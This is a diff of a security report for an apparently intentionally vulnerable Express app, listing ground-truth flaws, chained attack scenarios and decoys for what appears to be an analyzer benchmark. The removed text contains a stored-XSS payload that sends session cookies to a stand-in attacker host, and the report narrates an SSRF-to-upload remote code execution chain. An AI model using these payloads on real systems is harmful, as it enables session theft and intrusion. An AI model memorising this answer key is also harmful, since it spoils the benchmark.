@@ -1,117 +1,111 @@
-# Security Report: app-15-digital-assets
+# Security Report: app-15 — Digital Asset Management
 
-## Application Information
-
-- **App ID**: app-15
-- **App Name**: Digital Assets Manager
-- **Language**: TypeScript
-- **Framework**: Express
-- **Source**: `apps/typescript/app-15-digital-assets/`
+**Language:** Typescript (Express)
+**Directory:** `apps/typescript/app-15-digital-assets`
 
 ---
+
+## Application Information
+- **App ID:** app-15
+- **Name:** Digital Asset Management
+- **Language:** Typescript
+- **Framework:** Express
 
 ## Vulnerability Summary
 
+The following vulnerability list represents the ground truth security issues identified for this application:
+
 | ID | OWASP | Category | Severity | Location | CWE |
 |---|---|---|---|---|---|
-| V1 | A01 | Broken Access Control | Medium | `src/index.ts` → `GET /api/portfolios/:id` (lines 156-170) | CWE-639 |
-| V2 | A03 | Injection | High | `src/index.ts` → `GET /api/assets/search` (lines 173-185) | CWE-79 |
-| V3 | A09 | Security Logging and Monitoring Failures | Low | `src/index.ts` → `POST /api/admin/portfolios/:id/delete` (lines 192-208) | CWE-778 |
-
-### V1: IDOR on Portfolio Details
-
-**OWASP Category**: A01 — Broken Access Control
-
-**Description**: Viewing digital asset portfolio details by ID lacks verification of user ownership, allowing any authenticated user to retrieve details of another investor's portfolio.
-
-**Endpoint**: `GET /api/portfolios/:id`
-
-**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
-
-**Impact**: Medium — Any authenticated user can enumerate portfolio IDs to view sensitive asset holdings, valuations, and transaction history.
-
-**Detection**: Look for absence of ownership checks where the `:id` parameter is used without verifying `req.user.id` against the portfolio's owner ID.
+| V1 | A01 | Broken Access Control | High | src/index.ts | CWE-639 |
+| V2 | A08 | Software and Data Integrity Failures | High | src/index.ts | CWE-434 |
+| V3 | A10 | Server-Side Request Forgery | Medium | src/index.ts | CWE-918 |
 
 ---
 
-### V2: Stored XSS in Asset Search Results
+## Standalone Vulnerabilities
 
-**OWASP Category**: A03 — Injection
+### VULN-01: A01 — Broken Access Control
 
-**Description**: Asset descriptions are rendered in search results without HTML encoding, enabling stored cross-site scripting.
+- **Severity:** High
+- **Location:** `src/index.ts`:135-156 (method: `GET /api/assets/:id`)
+- **CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
 
-**Endpoint**: `GET /api/assets/search`
+#### Description
+Asset detail endpoint returns private files and download URLs by ID without checking if the requesting user owns the asset.
 
-**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
+### VULN-02: A08 — Software and Data Integrity Failures
 
-**Impact**: High — An attacker can inject malicious JavaScript in an asset description field. When other users search for or view that asset, the script executes in their browser, potentially stealing session tokens or performing actions on their behalf.
+- **Severity:** High
+- **Location:** `src/index.ts`:158-182 (method: `POST /api/assets/upload`)
+- **CWE:** [CWE-434](https://cwe.mitre.org/data/definitions/434.html)
 
-**Detection**: Look for asset description fields being served as raw HTML strings in API responses and rendered client-side with `innerHTML` or similar without sanitization.
+#### Description
+Upload endpoint uses Multer disk storage and accepts any file extension with no validation, writing files directly into the web-accessible directory.
+
+### VULN-03: A10 — Server-Side Request Forgery
+
+- **Severity:** Medium
+- **Location:** `src/index.ts`:184-228 (method: `POST /api/assets/import`)
+- **CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
+
+#### Description
+Import endpoint fetches file content from user-specified URLs using the global fetch API without restricting requests to loopback or private IP ranges.
+
 
 ---
 
-### V3: Missing Audit Log on Portfolio Deletion
+## Chained Attack Scenarios
 
-**OWASP Category**: A09 — Security Logging and Monitoring Failures
+Chained scenarios represent multiple code-level weaknesses that, when exploited in sequence, lead to high-impact outcomes.
 
-**Description**: Deleting investment portfolios from the system produces no audit logs, blindfolding administrators to record destruction.
+### CHAIN-01: SSRF File Fetch → Predictable Path RCE
 
-**Endpoint**: `POST /api/admin/portfolios/:id/delete`
+- **Combined Impact:** `lateral_movement`
+- **Difficulty:** Medium
+- **Subtlety Tags:** `cross_file` `direct_data_flow` `realistic_decoy`
 
-**CWE**: CWE-778 (Insufficient Logging)
+#### Prerequisites
+- attacker can reach the public request path
+- attacker can control one request parameter or body field
 
-**Impact**: Low — Malicious or accidental deletion of portfolio records cannot be traced or investigated.
+#### Attack Narrative
+An attacker uses the SSRF vulnerability on the import endpoint to fetch a script from an internal service or external host. The file is saved directly into the public web directory (`/uploads/`) with its original filename due to unvalidated upload logic, allowing the attacker to execute it via direct HTTP request.
 
-**Detection**: Check the delete handler for any logging, audit trail, or notification mechanism before/after performing the deletion operation.
+#### Chain Components
+| Step | Description | Severity | OWASP | CWE | Location | Method |
+|---|---|---|---|---|---|---|
+| 1 | SSRF in asset import fetches arbitrary network URLs. | Medium | A10 | CWE-918 | src/index.ts | `POST /api/assets/import` |
+| 2 | Unrestricted file writing places fetched script inside web public uploads directory, enabling RCE. | Medium | A08 | CWE-434 | src/index.ts | `POST /api/assets/import` |
 
----
+### CHAIN-02: Subtle Ssrf Pivot To Ssrf
 
-## Chained Attack Scenario
+- **Combined Impact:** `lateral_movement`
+- **Difficulty:** Hard
+- **Subtlety Tags:** `cross_file` `stateful_flow` `implicit_trust` `realistic_decoy` `secondary_chain`
 
-### Chain: "Stored XSS Portfolio Malware → Asset Portfolio IDOR Exfiltration"
+#### Prerequisites
+- attacker has or can create a low privilege account
+- attacker can combine request input with stored application state
 
-**Impact**: `account_takeover`
+#### Attack Narrative
+Attacker combines a low-visibility entry point with stored or derived application state, then pivots to a higher-impact sink that is reachable only after following the cross-file flow.
 
-**Overview**: An attacker embeds a malicious script in an asset description, which steals a portfolio manager's session when they view search results. The attacker then uses the session to exfiltrate other users' portfolio data via IDOR.
+#### Chain Components
+| Step | Description | Severity | OWASP | CWE | Location | Method |
+|---|---|---|---|---|---|---|
+| 1 | Import endpoint fetches file content from user-specified URLs using the global fetch API without restricting requests to loopback or private IP ranges. | Medium | A10 | CWE-918 | src/index.ts | `POST /api/assets/import` |
+| 2 | Upload endpoint uses Multer disk storage and accepts any file extension with no validation, writing files directly into the web-accessible directory. | High | A08 | CWE-434 | src/index.ts | `POST /api/assets/upload` |
+| 3 | Asset detail endpoint returns private files and download URLs by ID without checking if the requesting user owns the asset. | High | A01 | CWE-639 | src/index.ts | `GET /api/assets/:id` |
 
-**Components**:
-
-| Step | Issue | Severity | OWASP | CWE | Location |
-|---|---|---|---|---|---|
-| 1 | Stored XSS in asset descriptions enables session cookie theft | Medium | A03 | CWE-79 | `GET /api/assets/search` |
-| 2 | Portfolio detail endpoint permits IDOR exfiltration of sensitive holdings | Medium | A01 | CWE-639 | `GET /api/portfolios/:id` |
-
-**Attack Narrative**:
-1. The attacker posts an asset with a description containing a malicious JavaScript payload: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`.
-2. When a portfolio manager searches for assets via `GET /api/assets/search`, the XSS payload executes in their browser, exfiltrating their session cookie to the attacker.
-3. Using the hijacked session, the attacker queries `GET /api/portfolios/3` through IDOR to retrieve detailed portfolio data from other investors.
-
-**Combined Impact**: Account takeover — An attacker can steal admin sessions and exfiltrate sensitive portfolio data by chaining stored XSS with IDOR.
 
 ---
 
 ## Decoys (False-Positive Candidates)
 
+These code patterns mimic security weaknesses but are safe. They are included to measure static analyzer precision:
+
 | Location | Description |
 |---|---|
-| `src/index.ts` | Proper parameterized query logic in `POST /api/portfolios/create` to create new portfolios safely |
-| `src/index.ts` | Proper Bcrypt hashing for password storage and validation |
-
----
-
-## Detection Commands
-
-```bash
-# Find IDOR on portfolio details
-grep -n "portfolios.*:id\|findOne\|findById" apps/typescript/app-15-digital-assets/src/index.ts
-
-# Find XSS in asset search
-grep -n "search\|innerHTML\|res\.send\|escape\|sanitize" apps/typescript/app-15-digital-assets/src/index.ts
-
-# Find missing audit logs on deletion
-grep -n "delete\|remove\|log\|audit" apps/typescript/app-15-digital-assets/src/index.ts
-```
-
----
-
-*Report generated from `.vulns` manifest for app-15-digital-assets*
+| src/index.ts | Input validation guardrail on tags endpoint check, ensuring tag content is strictly alphanumeric via regex. |
+| src/index.ts | Secure Bearer Authorization token checking requirement on the administrative statistics stats endpoint. |
